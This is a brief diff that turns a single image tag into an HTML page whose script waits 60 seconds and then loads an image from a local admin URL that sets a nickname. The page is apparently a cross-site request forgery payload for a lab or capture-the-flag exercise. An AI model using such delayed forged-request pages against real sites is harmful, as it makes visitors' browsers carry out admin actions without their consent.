@@ -1,1 +1,11 @@
-<img src="http://127.0.0.1/admin?nickname=hehe"/>
+<html>
+<body>
+    <script>
+        setTimeout(() => {
+            const img = document.createElement("img");
+            img.src = "http://127.0.0.1/admin?nickname=hehe";
+            document.body.appendChild(img);
+        }, 60000); // Delay for 60 seconds
+    </script>
+</body>
+</html>
